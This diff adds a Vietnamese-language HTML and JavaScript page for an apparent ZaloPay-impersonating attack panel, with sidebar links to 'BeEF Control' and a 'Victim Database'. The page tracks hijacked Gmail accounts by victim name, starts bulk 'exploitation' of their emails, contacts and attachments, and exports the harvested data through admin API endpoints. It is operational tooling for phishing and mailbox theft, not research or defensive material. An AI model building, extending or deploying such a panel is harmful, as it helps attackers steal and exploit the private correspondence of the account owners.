@@ -1,0 +1,964 @@
+<!DOCTYPE html>
+<html lang="vi" data-bs-theme="light">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gmail Access Interface - ZaloPay Admin</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="css/gmail-responsive.css">
+    <style>
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+        }
+        .sidebar {
+            width: 260px;
+            min-height: 100vh;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        }
+        .main-content {
+            flex: 1;
+            background-color: #f8f9fa;
+        }
+        .status-badge {
+            font-size: 0.75rem;
+            padding: 0.25rem 0.5rem;
+        }
+        .progress {
+            height: 8px;
+        }
+        .table-responsive {
+            max-height: 600px;
+        }
+        .search-box {
+            max-width: 300px;
+        }
+        .filter-section {
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+        .stats-card {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+        }
+        .action-btn {
+            margin: 0 2px;
+        }
+    </style>
+</head>
+<body>
+    <div class="d-flex">
+        <!-- Sidebar -->
+        <nav class="sidebar d-flex flex-column p-3">
+            <a href="#" class="d-flex align-items-center mb-3 mb-md-0 me-md-auto text-white text-decoration-none">
+                <img src="#" alt="ZaloPay Logo" class="me-2 sidebar-logo-img">
+                <span class="fs-4">ZaloPay</span>
+            </a>
+            <hr>
+            <ul class="nav nav-pills flex-column mb-auto">
+                <li class="nav-item">
+                    <a href="index.html" class="nav-link text-white">
+                        <i class="fa-solid fa-house me-2"></i>
+                        <span>Dashboard</span>
+                    </a>
+                </li>
+                <li class="nav-item">
+                    <a href="gmail_access.html" class="nav-link text-white active">
+                        <i class="fa-solid fa-envelope me-2"></i>
+                        <span>Gmail Access</span>
+                    </a>
+                </li>
+                <li class="nav-item">
+                    <a href="beef_dashboard.html" class="nav-link text-white">
+                        <i class="fa-solid fa-bug me-2"></i>
+                        <span>BeEF Control</span>
+                    </a>
+                </li>
+                <li class="nav-item">
+                    <a href="victim_database.html" class="nav-link text-white">
+                        <i class="fa-solid fa-database me-2"></i>
+                        <span>Victim Database</span>
+                    </a>
+                </li>
+            </ul>
+        </nav>
+
+        <!-- Main Content -->
+        <main class="main-content p-4">
+            <!-- Header -->
+            <div class="d-flex justify-content-between align-items-center mb-4">
+                <div>
+                    <h1 class="h3 mb-0">Gmail Access Interface</h1>
+                    <p class="text-muted">Quản lý truy cập Gmail và tiến trình khai thác dữ liệu</p>
+                </div>
+                <div class="d-flex gap-2">
+                    <button class="btn btn-success" onclick="extractAllGmail()">
+                        <i class="fas fa-download me-2"></i>Khai thác tất cả
+                    </button>
+                    <button class="btn btn-primary" onclick="refreshData()">
+                        <i class="fas fa-sync-alt me-2"></i>Làm mới
+                    </button>
+                </div>
+            </div>
+
+            <!-- Statistics Cards -->
+            <div class="row mb-4">
+                <div class="col-xl-3 col-md-6 mb-4">
+                    <div class="card stats-card shadow h-100 py-2">
+                        <div class="card-body">
+                            <div class="row no-gutters align-items-center">
+                                <div class="col mr-2">
+                                    <div class="text-xs font-weight-bold text-uppercase mb-1">
+                                        Tổng truy cập Gmail
+                                    </div>
+                                    <div class="h5 mb-0 font-weight-bold">
+                                        <span id="totalAccess">0</span>
+                                    </div>
+                                </div>
+                                <div class="col-auto">
+                                    <i class="fas fa-envelope fa-2x text-white-50"></i>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="col-xl-3 col-md-6 mb-4">
+                    <div class="card border-left-success shadow h-100 py-2">
+                        <div class="card-body">
+                            <div class="row no-gutters align-items-center">
+                                <div class="col mr-2">
+                                    <div class="text-xs font-weight-bold text-success text-uppercase mb-1">
+                                        Đã khai thác
+                                    </div>
+                                    <div class="h5 mb-0 font-weight-bold text-gray-800">
+                                        <span id="extractedCount">0</span>
+                                    </div>
+                                </div>
+                                <div class="col-auto">
+                                    <i class="fas fa-check-circle fa-2x text-gray-300"></i>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="col-xl-3 col-md-6 mb-4">
+                    <div class="card border-left-warning shadow h-100 py-2">
+                        <div class="card-body">
+                            <div class="row no-gutters align-items-center">
+                                <div class="col mr-2">
+                                    <div class="text-xs font-weight-bold text-warning text-uppercase mb-1">
+                                        Đang khai thác
+                                    </div>
+                                    <div class="h5 mb-0 font-weight-bold text-gray-800">
+                                        <span id="extractingCount">0</span>
+                                    </div>
+                                </div>
+                                <div class="col-auto">
+                                    <i class="fas fa-spinner fa-2x text-gray-300"></i>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="col-xl-3 col-md-6 mb-4">
+                    <div class="card border-left-info shadow h-100 py-2">
+                        <div class="card-body">
+                            <div class="row no-gutters align-items-center">
+                                <div class="col mr-2">
+                                    <div class="text-xs font-weight-bold text-info text-uppercase mb-1">
+                                        Lỗi khai thác
+                                    </div>
+                                    <div class="h5 mb-0 font-weight-bold text-gray-800">
+                                        <span id="errorCount">0</span>
+                                    </div>
+                                </div>
+                                <div class="col-auto">
+                                    <i class="fas fa-exclamation-triangle fa-2x text-gray-300"></i>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Filters and Search -->
+            <div class="filter-section p-3 mb-4">
+                <div class="row g-3">
+                    <div class="col-md-3">
+                        <input type="text" class="form-control search-box" id="searchEmail" placeholder="Tìm kiếm email...">
+                    </div>
+                    <div class="col-md-2">
+                        <select class="form-select" id="filterStatus">
+                            <option value="">Tất cả trạng thái</option>
+                            <option value="active">Đang hoạt động</option>
+                            <option value="expired">Đã hết hạn</option>
+                            <option value="revoked">Đã thu hồi</option>
+                        </select>
+                    </div>
+                    <div class="col-md-2">
+                        <select class="form-select" id="filterExtraction">
+                            <option value="">Tình trạng khai thác</option>
+                            <option value="not_started">Chưa bắt đầu</option>
+                            <option value="in_progress">Đang thực hiện</option>
+                            <option value="completed">Đã hoàn thành</option>
+                            <option value="failed">Thất bại</option>
+                        </select>
+                    </div>
+                    <div class="col-md-2">
+                        <input type="date" class="form-control" id="filterDate" placeholder="Ngày truy cập">
+                    </div>
+                    <div class="col-md-3">
+                        <div class="d-flex gap-2">
+                            <button class="btn btn-outline-primary" onclick="applyFilters()">
+                                <i class="fas fa-search me-1"></i>Lọc
+                            </button>
+                            <button class="btn btn-outline-secondary" onclick="clearFilters()">
+                                <i class="fas fa-times me-1"></i>Xóa
+                            </button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Bulk Actions -->
+            <div class="d-flex justify-content-between align-items-center mb-3">
+                <div class="d-flex align-items-center">
+                    <span class="me-3">Đã chọn: <span id="selectedCount" class="fw-bold">0</span></span>
+                    <div class="btn-group" id="bulkActions" style="display: none;">
+                        <button class="btn btn-sm btn-success" onclick="bulkExtract()">
+                            <i class="fas fa-download me-1"></i>Khai thác
+                        </button>
+                        <button class="btn btn-sm btn-info" onclick="bulkExport()">
+                            <i class="fas fa-file-export me-1"></i>Xuất dữ liệu
+                        </button>
+                        <button class="btn btn-sm btn-danger" onclick="bulkDelete()">
+                            <i class="fas fa-trash me-1"></i>Xóa truy cập
+                        </button>
+                    </div>
+                </div>
+                <div class="d-flex align-items-center">
+                    <select class="form-select form-select-sm me-2" id="itemsPerPage" onchange="changeItemsPerPage()" style="width: auto;">
+                        <option value="10">10 mục</option>
+                        <option value="25" selected>25 mục</option>
+                        <option value="50">50 mục</option>
+                        <option value="100">100 mục</option>
+                    </select>
+                </div>
+            </div>
+
+            <!-- Gmail Access Table -->
+            <div class="card shadow">
+                <div class="card-header py-3 d-flex flex-row align-items-center justify-content-between">
+                    <h6 class="m-0 font-weight-bold text-primary">Danh sách truy cập Gmail</h6>
+                    <div class="dropdown">
+                        <button class="btn btn-sm btn-outline-primary dropdown-toggle" type="button" data-bs-toggle="dropdown">
+                            <i class="fas fa-cog me-1"></i>Tùy chọn
+                        </button>
+                        <ul class="dropdown-menu">
+                            <li><a class="dropdown-item" href="#" onclick="exportTable('csv')">
+                                <i class="fas fa-file-csv me-2"></i Xuất CSV
+                            </a></li>
+                            <li><a class="dropdown-item" href="#" onclick="exportTable('json')">
+                                <i class="fas fa-file-code me-2"></i>Xuất JSON
+                            </a></li>
+                            <li><hr class="dropdown-divider"></li>
+                            <li><a class="dropdown-item" href="#" onclick="showColumns()">
+                                <i class="fas fa-columns me-2"></i>Chọn cột hiển thị
+                            </a></li>
+                        </ul>
+                    </div>
+                </div>
+                <div class="card-body p-0">
+                    <div class="table-responsive">
+                        <table class="table table-hover mb-0">
+                            <thead class="table-light sticky-top">
+                                <tr>
+                                    <th class="text-center" width="40">
+                                        <input type="checkbox" class="form-check-input" id="selectAll" onchange="toggleSelectAll()">
+                                    </th>
+                                    <th>Email</th>
+                                    <th>Trạng thái truy cập</th>
+                                    <th>Tiến trình khai thác</th>
+                                    <th>Dữ liệu đã lấy</th>
+                                    <th>Ngày truy cập</th>
+                                    <th>Cập nhật cuối</th>
+                                    <th width="150">Thao tác</th>
+                                </tr>
+                            </thead>
+                            <tbody id="gmailAccessTable">
+                                <!-- Data will be loaded here -->
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Pagination -->
+            <nav aria-label="Pagination" class="mt-4">
+                <ul class="pagination justify-content-center" id="pagination">
+                    <!-- Pagination will be generated here -->
+                </ul>
+            </nav>
+
+            <!-- Loading Overlay -->
+            <div id="loadingOverlay" class="d-none" style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); z-index: 9999;">
+                <div class="d-flex justify-content-center align-items-center h-100">
+                    <div class="text-center text-white">
+                        <div class="spinner-border mb-3" role="status">
+                            <span class="visually-hidden">Đang tải...</span>
+                        </div>
+                        <div id="loadingText">Đang tải dữ liệu...</div>
+                    </div>
+                </div>
+            </div>
+        </main>
+    </div>
+
+    <!-- Progress Modal -->
+    <div class="modal fade" id="progressModal" tabindex="-1">
+        <div class="modal-dialog modal-lg">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h5 class="modal-title">Tiến trình khai thác Gmail</h5>
+                    <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
+                </div>
+                <div class="modal-body">
+                    <div class="mb-3">
+                        <div class="d-flex justify-content-between mb-2">
+                            <span>Tiến trình tổng thể</span>
+                            <span id="overallProgress">0%</span>
+                        </div>
+                        <div class="progress">
+                            <div class="progress-bar progress-bar-striped progress-bar-animated" id="overallProgressBar" style="width: 0%"></div>
+                        </div>
+                    </div>
+                    <div id="extractionDetails">
+                        <!-- Extraction details will be shown here -->
+                    </div>
+                </div>
+                <div class="modal-footer">
+                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Đóng</button>
+                    <button type="button" class="btn btn-warning" id="pauseBtn" onclick="pauseExtraction()">Tạm dừng</button>
+                    <button type="button" class="btn btn-danger" id="cancelBtn" onclick="cancelExtraction()">Hủy bỏ</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.css">
+    <script src="js/gmail-websocket.js"></script>
+    <script src="js/gmail-localization.js"></script>
+
+    <script>
+        let currentPage = 1;
+        let itemsPerPage = 25;
+        let totalItems = 0;
+        let gmailAccessData = [];
+        let filteredData = [];
+        let selectedItems = new Set();
+        let ws = null;
+
+        // Initialize page
+        document.addEventListener('DOMContentLoaded', function() {
+            loadGmailAccessData();
+            initializeWebSocket();
+            setupEventListeners();
+        });
+
+        function setupEventListeners() {
+            document.getElementById('searchEmail').addEventListener('input', debounce(applyFilters, 300));
+            document.getElementById('filterStatus').addEventListener('change', applyFilters);
+            document.getElementById('filterExtraction').addEventListener('change', applyFilters);
+            document.getElementById('filterDate').addEventListener('change', applyFilters);
+        }
+
+        function initializeWebSocket() {
+            // WebSocket is now handled by the global GmailWebSocketManager
+            // Set up event listeners for this interface
+            gmailWS.on('extraction_progress', updateExtractionProgress);
+            gmailWS.on('extraction_completed', handleExtractionCompleted);
+            gmailWS.on('extraction_failed', handleExtractionFailed);
+            gmailWS.on('new_access_granted', handleNewAccess);
+            gmailWS.on('access_revoked', handleAccessRevoked);
+            gmailWS.on('system_notification', handleSystemNotification);
+        }
+
+        function handleNewAccess(data) {
+            toastr.info(`Cấp quyền truy cập Gmail mới: ${data.email}`);
+            loadGmailAccessData(); // Refresh data
+        }
+
+        function handleAccessRevoked(data) {
+            toastr.warning(`Thu hồi quyền truy cập Gmail: ${data.email}`);
+            loadGmailAccessData(); // Refresh data
+        }
+
+        function handleSystemNotification(data) {
+            toastr.info(data.message);
+        }
+
+        async function loadGmailAccessData() {
+            showLoading('Đang tải dữ liệu truy cập Gmail...');
+
+            try {
+                const response = await fetch('/api/admin/gmail/access', {
+                    method: 'GET',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    }
+                });
+
+                if (!response.ok) {
+                    throw new Error(`HTTP error! status: ${response.status}`);
+                }
+
+                const result = await response.json();
+
+                if (result.success) {
+                    gmailAccessData = result.data;
+                    filteredData = [...gmailAccessData];
+                    updateStatistics();
+                    renderTable();
+                    renderPagination();
+                } else {
+                    throw new Error(result.message || 'Không thể tải dữ liệu');
+                }
+            } catch (error) {
+                console.error('Error loading Gmail access data:', error);
+                toastr.error('Không thể tải dữ liệu truy cập Gmail: ' + error.message);
+            } finally {
+                hideLoading();
+            }
+        }
+
+        function updateStatistics() {
+            const total = gmailAccessData.length;
+            const extracted = gmailAccessData.filter(item => item.extraction_status === 'completed').length;
+            const extracting = gmailAccessData.filter(item => item.extraction_status === 'in_progress').length;
+            const errors = gmailAccessData.filter(item => item.extraction_status === 'failed').length;
+
+            document.getElementById('totalAccess').textContent = total;
+            document.getElementById('extractedCount').textContent = extracted;
+            document.getElementById('extractingCount').textContent = extracting;
+            document.getElementById('errorCount').textContent = errors;
+        }
+
+        function renderTable() {
+            const tableBody = document.getElementById('gmailAccessTable');
+            const startIndex = (currentPage - 1) * itemsPerPage;
+            const endIndex = startIndex + itemsPerPage;
+            const pageData = filteredData.slice(startIndex, endIndex);
+
+            tableBody.innerHTML = '';
+
+            if (pageData.length === 0) {
+                tableBody.innerHTML = `
+                    <tr>
+                        <td colspan="8" class="text-center py-4 text-muted">
+                            <i class="fas fa-inbox fa-3x mb-3"></i>
+                            <p>Không có dữ liệu truy cập Gmail nào</p>
+                        </td>
+                    </tr>
+                `;
+                return;
+            }
+
+            pageData.forEach((item, index) => {
+                const row = createTableRow(item, startIndex + index);
+                tableBody.appendChild(row);
+            });
+        }
+
+        function createTableRow(item, globalIndex) {
+            const row = document.createElement('tr');
+
+            const accessStatusClass = getStatusClass(item.access_status);
+            const extractionStatusClass = getExtractionStatusClass(item.extraction_status);
+
+            row.innerHTML = `
+                <td class="text-center">
+                    <input type="checkbox" class="form-check-input item-checkbox" value="${globalIndex}" onchange="toggleItemSelection(${globalIndex})">
+                </td>
+                <td>
+                    <div class="d-flex align-items-center">
+                        <div class="avatar-wrapper me-3">
+                            <div class="avatar-circle bg-primary text-white">
+                                ${item.email.charAt(0).toUpperCase()}
+                            </div>
+                        </div>
+                        <div>
+                            <div class="fw-bold">${item.email}</div>
+                            <small class="text-muted">${item.victim_name || 'N/A'}</small>
+                        </div>
+                    </div>
+                </td>
+                <td>
+                    <span class="badge ${accessStatusClass}">${getStatusText(item.access_status)}</span>
+                </td>
+                <td>
+                    <div class="extraction-progress">
+                        ${createProgressBar(item)}
+                    </div>
+                </td>
+                <td>
+                    <div class="data-stats">
+                        ${formatDataStats(item)}
+                    </div>
+                </td>
+                <td>
+                    <small>${formatDate(item.access_date)}</small>
+                </td>
+                <td>
+                    <small>${formatDate(item.last_updated)}</small>
+                </td>
+                <td>
+                    <div class="btn-group btn-group-sm action-btn">
+                        ${createActionButtons(item)}
+                    </div>
+                </td>
+            `;
+
+            return row;
+        }
+
+        function createProgressBar(item) {
+            if (item.extraction_status === 'not_started') {
+                return '<span class="text-muted">Chưa bắt đầu</span>';
+            }
+
+            if (item.extraction_status === 'completed') {
+                return `
+                    <div class="d-flex align-items-center">
+                        <div class="progress me-2" style="width: 60px;">
+                            <div class="progress-bar bg-success" style="width: 100%"></div>
+                        </div>
+                        <small class="text-success">Hoàn thành</small>
+                    </div>
+                `;
+            }
+
+            if (item.extraction_status === 'failed') {
+                return `
+                    <div class="d-flex align-items-center">
+                        <div class="progress me-2" style="width: 60px;">
+                            <div class="progress-bar bg-danger" style="width: ${item.progress || 0}%"></div>
+                        </div>
+                        <small class="text-danger">Thất bại</small>
+                    </div>
+                `;
+            }
+
+            return `
+                <div class="d-flex align-items-center">
+                    <div class="progress me-2" style="width: 60px;">
+                        <div class="progress-bar progress-bar-striped progress-bar-animated bg-info" style="width: ${item.progress || 0}%"></div>
+                    </div>
+                    <small class="text-info">${item.progress || 0}%</small>
+                </div>
+            `;
+        }
+
+        function formatDataStats(item) {
+            if (!item.extracted_data) {
+                return '<small class="text-muted">Chưa có dữ liệu</small>';
+            }
+
+            return `
+                <small>
+                    <div>📧 ${item.extracted_data.emails || 0} emails</div>
+                    <div>👥 ${item.extracted_data.contacts || 0} liên hệ</div>
+                    <div>📎 ${item.extracted_data.attachments || 0} tệp đính kèm</div>
+                </small>
+            `;
+        }
+
+        function createActionButtons(item) {
+            let buttons = '';
+
+            if (item.extraction_status === 'not_started' || item.extraction_status === 'failed') {
+                buttons += `<button class="btn btn-sm btn-success" onclick="extractGmail('${item.id}')" title="Khai thác dữ liệu">
+                    <i class="fas fa-download"></i>
+                </button>`;
+            }
+
+            if (item.extraction_status === 'in_progress') {
+                buttons += `<button class="btn btn-sm btn-warning" onclick="pauseExtraction('${item.id}')" title="Tạm dừng">
+                    <i class="fas fa-pause"></i>
+                </button>`;
+            }
+
+            if (item.extraction_status === 'completed') {
+                buttons += `<button class="btn btn-sm btn-info" onclick="viewExtractedData('${item.id}')" title="Xem dữ liệu">
+                    <i class="fas fa-eye"></i>
+                </button>`;
+                buttons += `<button class="btn btn-sm btn-primary" onclick="exportGmailData('${item.id}')" title="Xuất dữ liệu">
+                    <i class="fas fa-file-export"></i>
+                </button>`;
+            }
+
+            buttons += `<button class="btn btn-sm btn-secondary" onclick="viewDetails('${item.id}')" title="Chi tiết">
+                <i class="fas fa-info-circle"></i>
+            </button>`;
+
+            buttons += `<button class="btn btn-sm btn-danger" onclick="deleteAccess('${item.id}')" title="Xóa truy cập">
+                <i class="fas fa-trash"></i>
+            </button>`;
+
+            return buttons;
+        }
+
+        function renderPagination() {
+            const totalPages = Math.ceil(filteredData.length / itemsPerPage);
+            const pagination = document.getElementById('pagination');
+
+            let html = '';
+
+            if (totalPages <= 1) {
+                pagination.innerHTML = '';
+                return;
+            }
+
+            // Previous button
+            html += `
+                <li class="page-item ${currentPage === 1 ? 'disabled' : ''}">
+                    <a class="page-link" href="#" onclick="changePage(${currentPage - 1})">Trước</a>
+                </li>
+            `;
+
+            // Page numbers
+            const startPage = Math.max(1, currentPage - 2);
+            const endPage = Math.min(totalPages, currentPage + 2);
+
+            for (let i = startPage; i <= endPage; i++) {
+                html += `
+                    <li class="page-item ${i === currentPage ? 'active' : ''}">
+                        <a class="page-link" href="#" onclick="changePage(${i})">${i}</a>
+                    </li>
+                `;
+            }
+
+            // Next button
+            html += `
+                <li class="page-item ${currentPage === totalPages ? 'disabled' : ''}">
+                    <a class="page-link" href="#" onclick="changePage(${currentPage + 1})">Tiếp</a>
+                </li>
+            `;
+
+            pagination.innerHTML = html;
+        }
+
+        function applyFilters() {
+            const searchTerm = document.getElementById('searchEmail').value.toLowerCase();
+            const statusFilter = document.getElementById('filterStatus').value;
+            const extractionFilter = document.getElementById('filterExtraction').value;
+            const dateFilter = document.getElementById('filterDate').value;
+
+            filteredData = gmailAccessData.filter(item => {
+                // Search filter
+                if (searchTerm && !item.email.toLowerCase().includes(searchTerm)) {
+                    return false;
+                }
+
+                // Status filter
+                if (statusFilter && item.access_status !== statusFilter) {
+                    return false;
+                }
+
+                // Extraction status filter
+                if (extractionFilter && item.extraction_status !== extractionFilter) {
+                    return false;
+                }
+
+                // Date filter
+                if (dateFilter && item.access_date && !item.access_date.startsWith(dateFilter)) {
+                    return false;
+                }
+
+                return true;
+            });
+
+            currentPage = 1;
+            renderTable();
+            renderPagination();
+        }
+
+        function clearFilters() {
+            document.getElementById('searchEmail').value = '';
+            document.getElementById('filterStatus').value = '';
+            document.getElementById('filterExtraction').value = '';
+            document.getElementById('filterDate').value = '';
+
+            filteredData = [...gmailAccessData];
+            currentPage = 1;
+            renderTable();
+            renderPagination();
+        }
+
+        function toggleSelectAll() {
+            const selectAllCheckbox = document.getElementById('selectAll');
+            const checkboxes = document.querySelectorAll('.item-checkbox');
+
+            checkboxes.forEach((checkbox, index) => {
+                checkbox.checked = selectAllCheckbox.checked;
+                if (selectAllCheckbox.checked) {
+                    selectedItems.add(index);
+                } else {
+                    selectedItems.delete(index);
+                }
+            });
+
+            updateSelectedCount();
+        }
+
+        function toggleItemSelection(index) {
+            const checkbox = document.querySelector(`.item-checkbox[value="${index}"]`);
+
+            if (checkbox.checked) {
+                selectedItems.add(index);
+            } else {
+                selectedItems.delete(index);
+            }
+
+            updateSelectedCount();
+
+            // Update select all checkbox
+            const allCheckboxes = document.querySelectorAll('.item-checkbox');
+            const checkedBoxes = document.querySelectorAll('.item-checkbox:checked');
+            document.getElementById('selectAll').checked = allCheckboxes.length === checkedBoxes.length && allCheckboxes.length > 0;
+        }
+
+        function updateSelectedCount() {
+            document.getElementById('selectedCount').textContent = selectedItems.size;
+
+            const bulkActions = document.getElementById('bulkActions');
+            if (selectedItems.size > 0) {
+                bulkActions.style.display = 'block';
+            } else {
+                bulkActions.style.display = 'none';
+            }
+        }
+
+        function changePage(page) {
+            if (page >= 1 && page <= Math.ceil(filteredData.length / itemsPerPage)) {
+                currentPage = page;
+                renderTable();
+                renderPagination();
+            }
+        }
+
+        function changeItemsPerPage() {
+            itemsPerPage = parseInt(document.getElementById('itemsPerPage').value);
+            currentPage = 1;
+            renderTable();
+            renderPagination();
+        }
+
+        // Action functions
+        async function extractGmail(accessId) {
+            try {
+                const response = await fetch(`/api/admin/gmail/extract/${accessId}`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    }
+                });
+
+                const result = await response.json();
+
+                if (result.success) {
+                    toastr.success('Đã bắt đầu khai thác dữ liệu Gmail');
+                    loadGmailAccessData(); // Refresh data
+                } else {
+                    toastr.error('Không thể bắt đầu khai thác: ' + result.message);
+                }
+            } catch (error) {
+                console.error('Error extracting Gmail:', error);
+                toastr.error('Lỗi khi khai thác dữ liệu Gmail');
+            }
+        }
+
+        async function extractAllGmail() {
+            if (!confirm('Bạn có chắc chắn muốn khai thác dữ liệu từ tất cả tài khoản Gmail?')) {
+                return;
+            }
+
+            try {
+                const response = await fetch('/api/admin/gmail/extract-all', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    }
+                });
+
+                const result = await response.json();
+
+                if (result.success) {
+                    toastr.success('Đã bắt đầu khai thác tất cả dữ liệu Gmail');
+                    loadGmailAccessData();
+                } else {
+                    toastr.error('Không thể bắt đầu khai thác hàng loạt: ' + result.message);
+                }
+            } catch (error) {
+                console.error('Error bulk extracting Gmail:', error);
+                toastr.error('Lỗi khi khai thác hàng loạt dữ liệu Gmail');
+            }
+        }
+
+        function viewExtractedData(accessId) {
+            window.location.href = `gmail_data_viewer.html?id=${accessId}`;
+        }
+
+        function exportGmailData(accessId) {
+            window.location.href = `gmail_export_interface.html?id=${accessId}`;
+        }
+
+        function viewDetails(accessId) {
+            // Show detailed information modal
+            alert('Chức năng xem chi tiết sẽ được triển khai');
+        }
+
+        async function deleteAccess(accessId) {
+            if (!confirm('Bạn có chắc chắn muốn xóa truy cập Gmail này?')) {
+                return;
+            }
+
+            try {
+                const response = await fetch(`/api/admin/gmail/access/${accessId}`, {
+                    method: 'DELETE',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    }
+                });
+
+                const result = await response.json();
+
+                if (result.success) {
+                    toastr.success('Đã xóa truy cập Gmail');
+                    loadGmailAccessData();
+                } else {
+                    toastr.error('Không thể xóa truy cập: ' + result.message);
+                }
+            } catch (error) {
+                console.error('Error deleting Gmail access:', error);
+                toastr.error('Lỗi khi xóa truy cập Gmail');
+            }
+        }
+
+        function bulkExtract() {
+            if (selectedItems.size === 0) {
+                toastr.warning('Vui lòng chọn ít nhất một mục để khai thác');
+                return;
+            }
+
+            const selectedData = Array.from(selectedItems).map(index => filteredData[index]);
+            // Implement bulk extraction logic
+            alert('Chức năng khai thác hàng loạt sẽ được triển khai');
+        }
+
+        function bulkExport() {
+            if (selectedItems.size === 0) {
+                toastr.warning('Vui lòng chọn ít nhất một mục để xuất dữ liệu');
+                return;
+            }
+
+            const selectedData = Array.from(selectedItems).map(index => filteredData[index]);
+            // Implement bulk export logic
+            alert('Chức năng xuất hàng loạt sẽ được triển khai');
+        }
+
+        function bulkDelete() {
+            if (selectedItems.size === 0) {
+                toastr.warning('Vui lòng chọn ít nhất một mục để xóa');
+                return;
+            }
+
+            if (!confirm(`Bạn có chắc chắn muốn xóa ${selectedItems.size} truy cập Gmail?`)) {
+                return;
+            }
+
+            // Implement bulk delete logic
+            alert('Chức năng xóa hàng loạt sẽ được triển khai');
+        }
+
+        function refreshData() {
+            loadGmailAccessData();
+        }
+
+        function showLoading(message = 'Đang xử lý...') {
+            document.getElementById('loadingText').textContent = message;
+            document.getElementById('loadingOverlay').classList.remove('d-none');
+        }
+
+        function hideLoading() {
+            document.getElementById('loadingOverlay').classList.add('d-none');
+        }
+
+        function debounce(func, wait) {
+            let timeout;
+            return function executedFunction(...args) {
+                const later = () => {
+                    clearTimeout(timeout);
+                    func(...args);
+                };
+                clearTimeout(timeout);
+                timeout = setTimeout(later, wait);
+            };
+        }
+
+        // Utility functions
+        function getStatusClass(status) {
+            switch(status) {
+                case 'active': return 'bg-success';
+                case 'expired': return 'bg-warning';
+                case 'revoked': return 'bg-danger';
+                default: return 'bg-secondary';
+            }
+        }
+
+        function getExtractionStatusClass(status) {
+            switch(status) {
+                case 'completed': return 'bg-success';
+                case 'in_progress': return 'bg-info';
+                case 'failed': return 'bg-danger';
+                default: return 'bg-secondary';
+            }
+        }
+
+        function getStatusText(status) {
+            switch(status) {
+                case 'active': return 'Đang hoạt động';
+                case 'expired': return 'Đã hết hạn';
+                case 'revoked': return 'Đã thu hồi';
+                default: return 'Không xác định';
+            }
+        }
+
+        function formatDate(dateString) {
+            if (!dateString) return 'N/A';
+            const date = new Date(dateString);
+            return date.toLocaleDateString('vi-VN') + ' ' + date.toLocaleTimeString('vi-VN', {
+                hour: '2-digit',
+                minute: '2-digit'
+            });
+        }
+
+        function exportTable(format) {
+            // Implement table export functionality
+            alert(`Chức năng xuất bảng dạng ${format.toUpperCase()} sẽ được triển khai`);
+        }
+
+        function showColumns() {
+            // Implement column selection functionality
+            alert('Chức năng chọn cột hiển thị sẽ được triển khai');
+        }
+    </script>
+</body>
+</html>
